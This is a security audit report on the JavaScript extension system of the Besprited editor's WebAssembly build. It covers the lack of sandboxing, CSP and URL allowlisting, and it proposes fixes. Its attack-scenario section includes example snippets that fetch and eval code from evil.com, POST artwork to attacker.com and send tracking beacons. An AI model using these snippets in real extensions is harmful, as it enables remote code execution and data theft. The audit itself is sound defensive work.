# Security Audit: JavaScript Extension System in WebAssembly Build

**Project:** Besprited  
**Audit Date:** 2026-02-06  
**Scope:** JavaScript/Duktape extension system when compiled to WebAssembly and executed in browser environment  
**Methodology:** Static code analysis of repository

---

## Executive Summary

This audit examines the security posture of Besprited's JavaScript extension system in its WebAssembly build. The application uses Duktape as its JavaScript engine, allowing user scripts to interact with the application through a C++ bridge. Analysis reveals **unrestricted JavaScript execution** with full access to browser networking, Wasm memory, and application state, presenting significant security risks when untrusted extensions are loaded.

**Risk Level:** HIGH - Extensions operate with application-level privileges without sandboxing.

---

## 1. Execution Model

### 1.1 Script Engine Architecture

**Engine:** Duktape 2.x (embedded JavaScript engine)
- **Location:** `/src/script/duktape/engine.cpp`
- **Heap Management:** Custom allocators using `base_malloc`/`base_free` (lines 30-55)
- **Execution Context:** Single global scope shared across all script evaluations

### 1.2 Loading Mechanism

**Primary Entry Point:** `AppScripting::evalFile()`
- **Path:** `/src/app/script/app_scripting.cpp:194-216`
- **Process:**
  1. Reads entire file into memory via `std::ifstream`
  2. Passes raw JavaScript string to `engine->eval()`
  3. Executes in global Duktape heap context
  4. Fires `init` event after evaluation

**Discovery System:**
- Scans files with `.js` extension
- Parses special `///` comment directives for metadata
- No signature verification or trust model

### 1.3 Installation Restrictions

**Wasm-Specific Behavior:** `/src/app/commands/cmd_install_script.cpp:35-39`
```cpp
#if defined(__EMSCRIPTEN__)
  return false;  // Installation disabled
#endif
```

Scripts **cannot** be dynamically installed in browser builds. Only pre-packaged scripts in the bundled filesystem can execute.

### 1.4 Privilege Model

Extensions execute with **full application privileges**:
- Direct access to Duktape global object
- No iframe/worker/realm isolation
- No capability-based security
- Persistent state through global `storage` object

---

## 2. Capability Matrix

| Capability | Status | Implementation | Evidence |
|------------|--------|----------------|----------|
| **Network: HTTP Fetch** | ✅ ALLOWED | Browser `fetch()` API via Emscripten | `src/net/http_request_wasm.cpp:100-105` |
| **Network: WebSocket** | ⚠️ UNCLEAR | Not explicitly restricted | No enforcement code found |
| **Network: CORS** | ✅ ENABLED | Mode set to `'cors'` | `http_request_wasm.cpp:102` |
| **Dynamic Code: eval()** | ✅ ALLOWED | Core Duktape functionality | `duktape/engine.cpp:139` |
| **Dynamic Code: Function()** | ✅ ALLOWED | JavaScript constructor available | Not restricted |
| **Dynamic Code: import()** | ❌ UNAVAILABLE | Duktape lacks ES6 modules | Engine limitation |
| **Browser Storage: localStorage** | ❌ NOT USED | File-based storage API instead | `api/storage_script.cpp` |
| **Browser Storage: IndexedDB** | ❌ NOT USED | File-based storage API instead | No IndexedDB calls found |
| **Browser Storage: Cookies** | ❌ NOT USED | No cookie API exposed | No cookie code found |
| **Filesystem: Virtual FS** | ✅ ALLOWED | Emscripten VFS with `/data` mount | `CMakeLists.txt:48` preload-file |
| **Clipboard API** | ⚠️ UNCLEAR | May inherit browser permissions | No explicit code found |
| **Wasm Memory: Read** | ✅ ALLOWED | Direct `HEAP8`/`HEAP32` access | `http_request_wasm.cpp:71-78` |
| **Wasm Memory: Write** | ✅ ALLOWED | Direct heap manipulation | `http_request_wasm.cpp:110-111` |
| **Application State** | ✅ ALLOWED | Full C++ API surface exposed | All `api/*_script.cpp` files |
| **Remote Script Loading** | ✅ POSSIBLE | Via `storage.fetch()` + `eval()` | `api/storage_script.cpp:130-158` |

---

## 3. Network Capabilities

### 3.1 HTTP Request Implementation

**Wasm-Specific Transport:** `/src/net/http_request_wasm.cpp`

The implementation uses Emscripten's `EM_ASM` macro to inject JavaScript that calls browser `fetch()`:

**Key Characteristics:**
- Method: GET and POST supported (line 101)
- CORS: Explicitly enabled with `mode: 'cors'` (line 102)
- Headers: Arbitrary custom headers allowed (lines 92-98)
- Response: Binary data copied into Wasm linear memory (lines 109-111)
- Synchronous: Busy-waits until fetch completes (lines 121-124)

### 3.2 Storage.fetch() API

**Exposed to Scripts:** `/src/app/script/api/storage_script.cpp:130-158`

JavaScript Interface:
```javascript
storage.fetch(url, storageKey, domain, "HeaderName", "value", "POST", "request body");
```

**Behavior:**
1. Accepts arbitrary URL (no allowlist)
2. Stores response in `storage[domain][storageKey]`
3. HTTP status saved to `storage[domain][storageKey + "_status"]`
4. Triggers event callback: `onEvent(storageKey + "_fetch")`

**Security Implications:**
- No URL validation or same-origin enforcement
- Relies entirely on browser CORS policy
- Downloaded content accessible to all script code
- Can be combined with `eval()` for remote code execution

### 3.3 Content Security Policy

**Finding:** **NO CSP CONFIGURED**

Analysis of:
- `/emscripten/index.html` - No CSP meta tag or headers
- `/emscripten/CMakeLists.txt` - No Emscripten CSP flags
- Build artifacts - No HTTP header configuration found

**Impact:** Browser defaults apply:
- `script-src`: Unrestricted (inline scripts allowed)
- `connect-src`: Unrestricted (any domain)
- `worker-src`: Unrestricted
- No protection against XSS or data exfiltration

---

## 4. Browser Data Access

### 4.1 Storage API

**Custom Implementation:** File-based storage abstraction

**NOT USING:**
- localStorage
- sessionStorage  
- IndexedDB
- Cookies

**Domain Isolation:** Scripts have isolated storage namespaces:
- Default domain: Script filename
- Custom domain: Optional parameter
- Path: `ResourceFinder` resolves to browser VFS location

**Persistence:**
- `storage.save(key, domain)` - Write to Emscripten virtual filesystem
- `storage.load(key, domain)` - Read from VFS
- VFS may persist via IndexedDB (Emscripten default), but not directly accessible

### 4.2 Clipboard Access

**No explicit code found.** Browser Clipboard API may be accessible through:
- Direct `navigator.clipboard` calls from Duktape
- Depends on browser permissions prompts

### 4.3 File Picker API

**Not exposed** in analyzed API surface.

---

## 5. WebAssembly Boundary Analysis

### 5.1 Memory Access Mechanisms

**Direct Heap Access:** Extensions can read/write Wasm linear memory

**Evidence:** `/src/net/http_request_wasm.cpp:69-119`
```javascript
const HEAP32 = GROWABLE_HEAP_U32();
const HEAP8 = GROWABLE_HEAP_U8();
// ... direct array indexing into Wasm memory
```

This pattern is accessible to extension code via:
1. Browser DevTools console
2. Inline `<script>` injection (no CSP)
3. `eval()` from extension JavaScript

### 5.2 Exported Wasm Functions

**Exports:** `/emscripten/CMakeLists.txt:48`
- `_main` - Application entry point
- `_onPointerEvent` - Input handler
- `cwrap` runtime method - Function wrapper utility

**Limited surface area**, but combined with memory access, provides full application control.

### 5.3 C++ API Bridge

**Exposed Objects:** All classes in `/src/app/script/api/`

Critical APIs:
- `app` - Active document, sprite, layer access
- `storage` - Network fetch + persistence
- `command` - Execute arbitrary app commands
- `Dialog`/`Widget` - UI manipulation
- `pixelColor` - Image data access

**Binding Mechanism:** `/src/script/duktape/engine.cpp:209-224`
- C++ functions registered as Duktape callbacks
- Arguments passed via `Value` conversion (lines 171-207)
- Return values pushed to Duktape stack

**Security Gap:** No permission checks or capability gates in binding layer.

### 5.4 Data Exfiltration Vectors

Extensions can access:
1. **Project Files:** Full sprite/layer/frame data via `app` API
2. **Memory Snapshots:** Direct Wasm heap reads
3. **User Files:** Loaded palette/image files through document API

All extractable via:
- `storage.fetch()` POST to attacker server
- Base64 encoding + URL parameter exfiltration
- Clipboard manipulation (if browser permits)

---

## 6. Concrete Attack Scenarios

### Scenario A: Remote Payload Injection

**Threat:** Malicious script downloads and executes remote code

**Attack Chain:**
```javascript
// In malicious.js extension:
storage.fetch("https://evil.com/payload.js", "code", "");
function onEvent(evt) {
  if (evt === "code_fetch") {
    var remoteCode = storage.get("code", "");
    eval(remoteCode); // Arbitrary code execution
  }
}
```

**Prerequisites:**
- Script pre-installed in Wasm bundle (cannot install at runtime)
- Network connectivity
- No CSP blocking fetch

**Impact:**
- Complete application compromise
- Keystroke logging via event hooks
- Persistent backdoor via storage API

**Mitigation Status:** ❌ NOT MITIGATED

---

### Scenario B: Project Data Exfiltration

**Threat:** Extension steals user artwork and sends to remote server

**Attack Chain:**
```javascript
// Extract sprite pixel data
var sprite = app.activeSprite;
var width = sprite.width;
var height = sprite.height;
var layer = sprite.layer(0);
// ... extract image data via pixelColor API ...

// Exfiltrate
storage.fetch("https://attacker.com/collect", "exfil", "", 
              "POST", encodedImageData);
```

**Prerequisites:**
- Active project open in editor
- Script executes during user session

**Impact:**
- Intellectual property theft
- Privacy violation (personal projects)
- Corporate espionage (commercial use)

**Mitigation Status:** ❌ NOT MITIGATED

---

### Scenario C: Persistent Tracking

**Threat:** Extension fingerprints user across sessions

**Attack Chain:**
```javascript
// Generate unique ID
var fingerprint = generateDeviceFingerprint();
storage.set(fingerprint, "tracker_id", "global");
storage.save("tracker_id", "global");

// Beacon home
storage.fetch("https://analytics.evil.com/beacon?id=" + fingerprint, 
              "beacon", "");
```

**Prerequisites:**
- Storage persistence via Emscripten VFS (typically IndexedDB)

**Impact:**
- Cross-session user tracking
- Analytics without consent
- Behavioral profiling

**Mitigation Status:** ⚠️ PARTIALLY MITIGATED (storage isolated by domain, but beacons possible)

---

### Scenario D: Wasm Memory Corruption

**Threat:** Direct memory manipulation crashes app or hijacks execution

**Attack Chain:**
```javascript
// Access Wasm heap (if available in scope)
var HEAP32 = Module.HEAP32;
var HEAP8 = Module.HEAP8;

// Corrupt application state
HEAP32[suspectedPointerLocation >> 2] = 0x41414141;
```

**Prerequisites:**
- `Module` object accessible to Duktape
- Knowledge of memory layout

**Impact:**
- Application crash (denial of service)
- Potential memory corruption exploits
- Undefined behavior

**Mitigation Status:** ⚠️ UNCLEAR (depends on Duktape global scope isolation)

---

## 7. Security Posture Classification

**Classification: Effectively Unrestricted JavaScript**

### Rationale:

✅ **Browser Sandbox Provides:**
- Process isolation from host OS
- Same-origin policy for document access
- Limited filesystem access (VFS only)

❌ **Application Does NOT Provide:**
- Script sandboxing (no worker/iframe isolation)
- Capability-based security
- Code signing or trust model
- CSP to restrict inline/remote code
- Network allowlisting
- Memory protection

### Trust Model Assessment:

**Current:** All scripts in bundle are implicitly trusted  
**Risk:** Supply chain attack - compromised dependency or build process could inject malicious script  
**Gap:** No verification mechanism for scripts in bundle

### Comparison to Industry Standards:

| Security Feature | Besprited | VSCode Extensions | Browser Extensions |
|------------------|-----------|-------------------|-------------------|
| Process Isolation | ❌ | ✅ (separate process) | ✅ (content scripts) |
| Capability Permissions | ❌ | ✅ (manifest.json) | ✅ (manifest v3) |
| Code Signing | ❌ | ✅ (marketplace) | ✅ (Web Store) |
| Network Restrictions | ❌ | ⚠️ (CSP in webviews) | ✅ (host permissions) |
| Sandboxing | ❌ | ✅ (limited APIs) | ✅ (isolated worlds) |

---

## 8. Hardening Recommendations

### 8.1 CRITICAL: Implement Content Security Policy

**Priority:** P0  
**Effort:** Low

**Actions:**
1. Add CSP meta tag to `/emscripten/index.html`:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'wasm-unsafe-eval'; 
               connect-src 'self'; 
               style-src 'self' 'unsafe-inline';">
```

2. Configure Emscripten flag in `/emscripten/CMakeLists.txt`:
```cmake
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} ... -s CSP=1")
```

**Impact:**
- Blocks inline script injection attacks
- Prevents remote script loading via `<script src>`
- Restricts network connections to same-origin
- `'wasm-unsafe-eval'` required for Wasm but safer than `'unsafe-eval'`

**Limitations:** Does not prevent `eval()` within Duktape context

---

### 8.2 HIGH: Restrict storage.fetch() Network Access

**Priority:** P0  
**Effort:** Medium

**Actions:**

1. Add URL allowlist validation in `/src/app/script/api/storage_script.cpp:130`:
```cpp
void fetch(const std::string& url, const std::string& key, const std::string& domain) {
  // Validate URL against allowlist
  static const std::vector<std::string> allowedOrigins = {
    "https://cdn.example.com",  // Official CDN only
  };
  
  bool allowed = false;
  for (const auto& origin : allowedOrigins) {
    if (url.substr(0, origin.length()) == origin) {
      allowed = true;
      break;
    }
  }
  
  if (!allowed) {
    std::cerr << "Blocked fetch to unauthorized URL: " << url << std::endl;
    return;
  }
  
  // ... existing fetch code
}
```

2. Add configuration option for users to manage allowlist

**Impact:**
- Prevents data exfiltration to arbitrary servers
- Blocks remote code loading
- Maintains legitimate use cases (palette downloads, etc.)

---

### 8.3 HIGH: Disable eval() in Duktape Context

**Priority:** P1  
**Effort:** Medium

**Actions:**

Modify `/src/script/duktape/engine.cpp:100-108`:
```cpp
DukEngine() :
  m_handle(duk_create_heap(&on_alloc_function,
                           &on_realloc_function,
                           &on_free_function,
                           (void*)this,
                           &on_fatal_handler))
  {
    InternalScriptObject::setDefault("DukScriptObject");
    
    // Disable dangerous globals
    duk_push_global_object(m_handle);
    duk_push_undefined(m_handle);
    duk_put_prop_string(m_handle, -2, "eval");
    duk_pop(m_handle);
  }
```

**Impact:**
- Breaks remote code execution via `eval()`
- May break legitimate script functionality (assess compatibility)

**Alternative:** Use Duktape bytecode compilation instead of string evaluation

---

### 8.4 MEDIUM: Implement Worker-Based Isolation

**Priority:** P2  
**Effort:** High

**Actions:**

1. Create new file `/src/script/worker_engine.cpp`:
   - Spawn Web Worker for script execution
   - Use `postMessage()` API bridge instead of direct C++ calls
   - Structured clone for data passing (prevents pointer sharing)

2. Modify message passing to allowlist commands:
   - Define permitted operations
   - Validate all messages from worker
   - Reject unauthorized API calls

**Impact:**
- Full process isolation for extensions
- Cannot access Wasm memory directly
- Reduced attack surface
- May impact performance (serialization overhead)

---

### 8.5 MEDIUM: Add Script Signature Verification

**Priority:** P2  
**Effort:** Medium

**Actions:**

1. Generate signing key pair (ed25519 recommended)
2. Sign all bundled scripts during build process
3. Add verification in `/src/app/script/app_scripting.cpp:194`:
```cpp
bool AppScripting::evalFile(const std::string& fileName) {
  // Read signature file
  std::string sigFile = fileName + ".sig";
  std::ifstream sigStream(sigFile);
  if (!sigStream) {
    std::cerr << "Missing signature for " << fileName << std::endl;
    return false;
  }
  
  // Verify signature using public key
  if (!verifyScriptSignature(fileName, sigFile, PUBLIC_KEY)) {
    std::cerr << "Invalid signature for " << fileName << std::endl;
    return false;
  }
  
  // ... existing load code
}
```

**Impact:**
- Detects tampered scripts
- Prevents supply chain injection
- Builds user trust

---

### 8.6 LOW: Add Runtime Permission System

**Priority:** P3  
**Effort:** High

**Actions:**

1. Define permission model (similar to browser extensions):
   - `network` - Allow storage.fetch()
   - `clipboard` - Allow clipboard access
   - `storage` - Allow persistent storage
   - `app-data` - Allow sprite/document access

2. Require scripts to declare permissions in header comments:
```javascript
/// permissions network storage app-data
```

3. Implement permission checks in API layer:
```cpp
if (!hasPermission(currentScript, "network")) {
  throw base::Exception("Permission denied: network");
}
```

4. Show user consent dialog on first run

**Impact:**
- Principle of least privilege
- User awareness of extension capabilities
- Granular control over features

---

### 8.7 LOW: Implement Subresource Integrity

**Priority:** P3  
**Effort:** Low

**Actions:**

Add SRI to `/emscripten/index.html:26`:
```html
<script async 
        src="besprited.js" 
        integrity="sha384-[HASH]" 
        crossorigin="anonymous"></script>
```

Generate hashes during build process.

**Impact:**
- Detects CDN compromise
- Ensures script integrity if served externally
- Defense-in-depth measure

---

## 9. Risk Summary

### Critical Risks (Immediate Action Required):

1. **Remote Code Execution:** `storage.fetch()` + `eval()` combination allows arbitrary code
2. **No CSP:** Inline scripts and remote resources unrestricted
3. **Data Exfiltration:** Project data can be sent to any URL via fetch

### High Risks (Address in Next Release):

4. **Memory Access:** Potential Wasm heap manipulation
5. **No Sandboxing:** Scripts execute with full app privileges
6. **No Trust Model:** All scripts implicitly trusted

### Medium Risks (Future Enhancement):

7. **Limited Auditability:** No logging of extension network activity
8. **Persistent Tracking:** Storage API enables cross-session fingerprinting

---

## 10. Conclusion

**If a user installs a third-party Besprited JS extension in the web build, exact damage:**

1. **Steal all project artwork** - Read sprite pixels, export, transmit via HTTP POST
2. **Exfiltrate user behavior** - Log all keystrokes, mouse movements via event hooks
3. **Execute arbitrary code** - Download and eval() remote JavaScript payloads
4. **Persist malicious code** - Save to storage API for execution on future sessions
5. **Manipulate application** - Execute any command, modify UI, corrupt documents
6. **Track user** - Generate fingerprint, beacon to analytics servers

**Primary Defense:** Installation disabled in Wasm builds (`cmd_install_script.cpp:35`)  
**Residual Risk:** Compromised scripts in official bundle remain executable

**Recommended Mitigation Priority:**
1. CSP implementation (immediate)
2. Network allowlisting (immediate)
3. Disable eval() or use bytecode (next release)
4. Worker isolation (future architecture improvement)

---

**End of Security Audit Report**
